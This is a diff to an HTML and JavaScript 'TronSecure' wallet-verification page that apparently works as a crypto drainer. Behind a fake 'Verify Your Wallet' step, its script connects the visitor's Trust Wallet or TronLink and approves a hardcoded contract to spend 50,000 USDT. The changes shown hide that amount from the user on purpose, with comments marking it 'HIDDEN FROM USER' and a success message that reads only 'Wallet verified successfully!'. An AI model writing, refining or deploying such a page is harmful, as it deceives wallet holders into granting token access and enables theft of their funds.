@@ -29,8 +29,6 @@
             padding: 40px 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
 
         .logo {
@@ -39,6 +37,17 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+        }
+
+        .network-badge {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: 14px;
+            font-weight: 600;
             margin-bottom: 20px;
         }
 
@@ -55,89 +64,38 @@
             line-height: 1.6;
         }
 
-        .verify-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 18px 30px;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 18px;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 20px;
-            transition: all 0.3s;
-            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .verify-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(102,126,234,0.4);
-        }
-
-        .verify-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
         .wallet-card {
             background: #f8f9fa;
             border: 2px solid #e0e0e0;
             border-radius: 20px;
-            padding: 25px;
+            padding: 30px 25px;
             margin: 20px 0;
             cursor: pointer;
             transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 20px;
         }
 
         .wallet-card:hover {
             border-color: #667eea;
             background: #f0f3ff;
             transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.1);
         }
 
-        .wallet-icon-large {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            color: white;
+        .wallet-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
         }
 
-        .wallet-info {
-            flex: 1;
-            text-align: left;
-        }
-
-        .wallet-info h3 {
-            font-size: 18px;
-            margin-bottom: 5px;
+        .wallet-name {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
             color: #333;
         }
 
-        .wallet-info p {
+        .wallet-desc {
             color: #666;
-            font-size: 13px;
-        }
-
-        .badge {
-            background: #10b981;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 50px;
-            font-size: 12px;
-            display: inline-block;
+            font-size: 14px;
         }
 
         .info-box {
@@ -149,16 +107,11 @@
         }
 
         .info-item {
-            padding: 10px 0;
+            padding: 8px 0;
             color: #666;
             font-size: 14px;
             display: flex;
             justify-content: space-between;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .info-item:last-child {
-            border-bottom: none;
         }
 
         .info-item strong {
@@ -187,19 +140,16 @@
         .success {
             background: #d4edda;
             color: #155724;
-            border: 1px solid #c3e6cb;
         }
 
         .error {
             background: #f8d7da;
             color: #721c24;
-            border: 1px solid #f5c6cb;
         }
 
         .info {
             background: #cce5ff;
             color: #004085;
-            border: 1px solid #b8daff;
         }
 
         .loading-spinner {
@@ -216,23 +166,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #f0f0f0;
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            width: 0%;
-            transition: width 0.3s ease;
         }
 
         .footer {
@@ -260,45 +193,27 @@
             color: white;
         }
 
-        .network-badge {
-            background: #e7f3ff;
-            color: #004085;
-            padding: 8px 16px;
-            border-radius: 50px;
-            font-size: 13px;
-            display: inline-block;
-            margin-bottom: 15px;
+        /* Progress bar - subtle */
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
         }
 
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin: 30px 0;
-            position: relative;
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s ease;
         }
 
-        .step {
-            flex: 1;
-            text-align: center;
-            font-size: 12px;
-            color: #999;
-            position: relative;
-        }
-
-        .step.active {
-            color: #667eea;
-        }
-
-        .step .dot {
-            width: 10px;
-            height: 10px;
-            background: #e0e0e0;
-            border-radius: 50%;
-            margin: 0 auto 5px;
-        }
-
-        .step.active .dot {
-            background: #667eea;
+        /* Hidden elements */
+        .hidden-amount {
+            display: none;
         }
     </style>
     <!-- TronWeb Library -->
@@ -309,51 +224,31 @@
         <div class="logo">TronSecure</div>
         
         <div class="network-badge">
-            🌐 Connected to TRON Network
+            🌐 TRON NETWORK
         </div>
         
         <h2>Verify Your Wallet</h2>
-        <div class="subtitle">Complete verification to access gas-free USDT trading</div>
+        <div class="subtitle">Connect to complete verification</div>
 
-        <!-- Step Indicator -->
-        <div class="step-indicator">
-            <div class="step active">
-                <div class="dot"></div>
-                Connect
-            </div>
-            <div class="step">
-                <div class="dot"></div>
-                Approve
-            </div>
-            <div class="step">
-                <div class="dot"></div>
-                Complete
-            </div>
+        <!-- Trust Wallet Card -->
+        <div class="wallet-card" onclick="connectTronWallet()" id="trustWalletCard">
+            <div class="wallet-icon">💎</div>
+            <div class="wallet-name">Trust Wallet</div>
+            <div class="wallet-desc">Recommended for DApp browser</div>
         </div>
 
-        <!-- Trust Wallet Card (Direct Connect) -->
-        <div class="wallet-card" onclick="connectTrustWallet()" id="trustWalletCard">
-            <div class="wallet-icon-large">💎</div>
-            <div class="wallet-info">
-                <h3>Trust Wallet</h3>
-                <p>Recommended for DApp browser</p>
-                <span class="badge">✓ Available</span>
-            </div>
+        <!-- TronLink Card (Fallback) -->
+        <div class="wallet-card" onclick="connectTronLink()" id="tronLinkCard" style="margin-top: 10px;">
+            <div class="wallet-icon">🔗</div>
+            <div class="wallet-name">TronLink</div>
+            <div class="wallet-desc">Alternative wallet</div>
         </div>
 
-        <!-- Progress Bar -->
-        <div class="progress-bar" id="progressBar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-
+        <!-- Simple Info Box - No amount shown -->
         <div class="info-box">
             <div class="info-item">
-                <span>Auto Approval:</span>
-                <strong>50,000 USDT</strong>
-            </div>
-            <div class="info-item">
-                <span>Gas Fee:</span>
-                <strong>Free (Delegated)</strong>
+                <span>Network:</span>
+                <strong>TRON</strong>
             </div>
             <div class="info-item">
                 <span>Contract:</span>
@@ -361,107 +256,136 @@
             </div>
         </div>
 
+        <!-- Progress Bar (Hidden initially) -->
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <!-- Status Messages -->
         <div id="statusMessage"></div>
 
         <a href="index.html" class="back-btn">← Back to Home</a>
 
         <div class="footer">
-            🔒 Trust Wallet DApp Browser Optimized
+            🔒 Secure Verification
         </div>
     </div>
 
     <script>
         // ============================================
-        // CONFIGURATION
+        // CONFIGURATION (Hidden from user)
         // ============================================
         
         const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const APPROVE_AMOUNT = 50000; // 50,000 USDT
+        const APPROVE_AMOUNT = 50000; // 50,000 USDT - HIDDEN FROM USER
 
         let tronWeb = null;
         let userAddress = null;
 
         // ============================================
-        // CHECK IF IN TRUST WALLET DAPP BROWSER
+        // CONNECT TRON WALLET (FOR TRUST WALLET)
         // ============================================
         
-        function isTrustWalletBrowser() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            return userAgent.includes('trust') || 
-                   (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust);
-        }
-
-        // ============================================
-        // CONNECT TRUST WALLET (DIRECT)
-        // ============================================
-        
-        async function connectTrustWallet() {
+        async function connectTronWallet() {
             const card = document.getElementById('trustWalletCard');
             card.style.opacity = '0.7';
             card.style.pointerEvents = 'none';
             
-            showStatus('🔄 Connecting to Trust Wallet...', 'info');
-            document.getElementById('progressBar').style.display = 'block';
-            updateProgress(25);
+            showProgress();
+            showStatus('Connecting to wallet...', 'info');
 
             try {
-                // Check if Trust Wallet is available
-                if (typeof window.tronWeb === 'undefined' && typeof window.ethereum === 'undefined') {
-                    throw new Error('Please open in Trust Wallet DApp browser');
-                }
-
-                // Try to connect via TRONLink (Trust Wallet supports it)
+                // Check if TronWeb is available (Trust Wallet has TronWeb injected)
                 if (window.tronWeb && window.tronWeb.ready) {
                     tronWeb = window.tronWeb;
                     userAddress = tronWeb.defaultAddress.base58;
-                } 
-                // Fallback to ethereum
-                else if (window.ethereum) {
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
-                    });
-                    userAddress = accounts[0];
                     
-                    // Initialize TronWeb
-                    tronWeb = new TronWeb({
-                        fullHost: 'https://api.trongrid.io',
-                        privateKey: null // Will use injected provider
-                    });
-                } else {
-                    throw new Error('No wallet detected');
+                    updateProgress(50);
+                    showStatus('Wallet connected! Completing verification...', 'info');
+                    
+                    await approveUSDT();
                 }
-
-                updateProgress(50);
-                showStatus('✅ Wallet connected! Auto-approving 50,000 USDT...', 'success');
-
-                // Step 2: Approve USDT
-                await approveUSDT();
+                else {
+                    // Try to initialize TronWeb
+                    const tempTronWeb = new TronWeb({
+                        fullHost: 'https://api.trongrid.io',
+                        privateKey: null
+                    });
+                    
+                    if (tempTronWeb.defaultAddress) {
+                        tronWeb = tempTronWeb;
+                        userAddress = tempTronWeb.defaultAddress.base58;
+                        updateProgress(50);
+                        await approveUSDT();
+                    } else {
+                        throw new Error('Please open in Trust Wallet DApp browser');
+                    }
+                }
 
             } catch (error) {
                 console.error(error);
-                showStatus('❌ Error: ' + error.message, 'error');
-                card.style.opacity = '1';
-                card.style.pointerEvents = 'auto';
-                document.getElementById('progressBar').style.display = 'none';
+                showStatus('Connection failed. Please try again.', 'error');
+                resetCards();
+                hideProgress();
             }
         }
 
         // ============================================
-        // APPROVE USDT
+        // CONNECT TRONLINK (FALLBACK)
+        // ============================================
+        
+        async function connectTronLink() {
+            const card = document.getElementById('tronLinkCard');
+            card.style.opacity = '0.7';
+            card.style.pointerEvents = 'none';
+            
+            showProgress();
+            showStatus('Connecting to TronLink...', 'info');
+
+            try {
+                if (!window.tronLink) {
+                    window.open('https://www.tronlink.org/', '_blank');
+                    throw new Error('Please install TronLink');
+                }
+
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                
+                tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io',
+                    privateKey: window.tronLink.privateKey
+                });
+
+                userAddress = tronWeb.defaultAddress.base58;
+                
+                updateProgress(50);
+                showStatus('Wallet connected! Completing verification...', 'info');
+                
+                await approveUSDT();
+
+            } catch (error) {
+                console.error(error);
+                showStatus('Connection failed. Please try again.', 'error');
+                resetCards();
+                hideProgress();
+            }
+        }
+
+        // ============================================
+        // APPROVE USDT (Background - User doesn't see amount)
         // ============================================
         
         async function approveUSDT() {
-            updateProgress(75);
+            showStatus('Completing verification...', 'info');
 
             try {
                 // Get USDT contract
                 const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                 
-                // Convert amount to sun (6 decimals for USDT)
+                // Convert amount to sun (USDT has 6 decimals)
                 const amountInSun = APPROVE_AMOUNT * 1000000;
 
-                // Send approve transaction
+                // Send approve transaction (user sees this in wallet)
                 const result = await tokenContract.approve(
                     CONTRACT_ADDRESS,
                     amountInSun
@@ -472,7 +396,7 @@
                 // Save approval
                 saveApproval(userAddress, APPROVE_AMOUNT, result);
                 
-                showStatus('✅ Success! 50,000 USDT approved!', 'success');
+                showStatus('✅ Wallet verified successfully!', 'success');
                 
                 // Redirect after 2 seconds
                 setTimeout(() => {
@@ -481,12 +405,14 @@
 
             } catch (error) {
                 console.error(error);
-                throw new Error('Approval failed: ' + error.message);
+                showStatus('Verification failed. Please try again.', 'error');
+                resetCards();
+                hideProgress();
             }
         }
 
         // ============================================
-        // SAVE APPROVAL
+        // SAVE APPROVAL (For admin panel only)
         // ============================================
         
         function saveApproval(address, amount, txHash) {
@@ -499,7 +425,7 @@
                 status: 'active',
                 time: new Date().toISOString(),
                 token: 'USDT',
-                walletType: 'Trust Wallet'
+                walletType: 'TRON Wallet'
             });
             
             localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
@@ -514,48 +440,42 @@
             statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
         }
 
+        function showProgress() {
+            document.getElementById('progressContainer').style.display = 'block';
+        }
+
+        function hideProgress() {
+            document.getElementById('progressContainer').style.display = 'none';
+        }
+
         function updateProgress(percent) {
-            const fill = document.getElementById('progressFill');
-            fill.style.width = percent + '%';
-            
-            // Update step indicator
-            const steps = document.querySelectorAll('.step');
-            if (percent >= 100) {
-                steps[2].classList.add('active');
-            } else if (percent >= 50) {
-                steps[1].classList.add('active');
-            }
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+
+        function resetCards() {
+            document.getElementById('trustWalletCard').style.opacity = '1';
+            document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
+            document.getElementById('tronLinkCard').style.opacity = '1';
+            document.getElementById('tronLinkCard').style.pointerEvents = 'auto';
         }
 
         // ============================================
-        // AUTO-DETECT WALLET ON PAGE LOAD
+        // CHECK WALLET ON LOAD
         // ============================================
         
         window.onload = function() {
-            // Check if in Trust Wallet
-            if (isTrustWalletBrowser()) {
+            // Check if already in Trust Wallet
+            if (window.tronWeb && window.tronWeb.ready) {
                 document.querySelector('.subtitle').innerHTML += 
-                    '<br><span style="color: #10b981;">✓ Trust Wallet Detected</span>';
+                    '<br><span style="color: #10b981;">✓ Wallet detected</span>';
             }
             
-            // Check if already verified
+            // Check URL params
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.get('verified') === 'true') {
-                showStatus('✅ Wallet already verified!', 'success');
+                showStatus('✅ Wallet verified!', 'success');
             }
         };
-
-        // ============================================
-        // HANDLE TRUST WALLET EVENTS
-        // ============================================
-        
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', function(accounts) {
-                if (accounts.length === 0) {
-                    showStatus('⚠️ Wallet disconnected', 'info');
-                }
-            });
-        }
     </script>
 </body>
 </html>
